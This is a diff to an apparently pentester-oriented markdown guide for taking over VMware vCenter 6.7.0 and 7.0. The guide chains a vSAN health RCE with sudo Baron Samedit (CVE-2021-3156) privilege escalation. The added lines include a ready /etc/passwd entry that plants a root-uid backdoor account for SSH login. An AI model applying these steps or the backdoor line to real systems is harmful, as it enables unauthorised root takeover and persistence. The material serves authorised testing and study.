@@ -1,4 +1,4 @@
-## Taking over VMware Vcenter 6.7.0
+## Taking over VMware Vcenter 6.7.0 or 7.0
 
 Chain of actions tested on `vCenter Appliance 6.7 Update 3 (6.7.0.40000). Intended for research or pentersters only.
 
@@ -15,6 +15,8 @@ alhough be patient, it usually succeeds in about 70% of attemtps only. If you do
 ![msf_vmware_vcenter_vsan_health_rce](msf_vmware_vcenter_vsan_health_rce.png)
 
 ### Escalating priviledges via CVE-2021-3156 (Sudo Baron Samedit)
+
+#### vcenter 6.7.0
 
 Vcenter 6.7.0 vsphere appliance runs on Photon OS Linux 1.0 with a sudo 1.8.20p2 vulnerable to CVE-2021-3156
 
@@ -40,9 +42,12 @@ success at 8303
 
 At this point you may use `ssh gg@your-vcenter` to logon to vsphere appliance as a root.
 
-### Escalation priviledges via CVE-2021-xxxxx (not yet published)
+#### vcenter 7.0.0
 
-To be updated once disclosed by VMWare ...
+Follow https://research.nccgroup.com/2021/07/06/exploiting-the-sudo-baron-samedit-vulnerability-cve-2021-3156-on-vmware-vcenter-server-7-0/
+
+Once you get a root shell via created `./sshell`, add `gg:$5$a$gemgwVPxLx/tdtByhncd4joKlMRYQ3IVwdoBXPACCL2:0:0:gg:/root:/bin/bash`
+line at the end of `/etc/passwd` and logon with root uid via `ssh gg@your-vcenter`.
 
 ### Geting credentials to vcenter
 
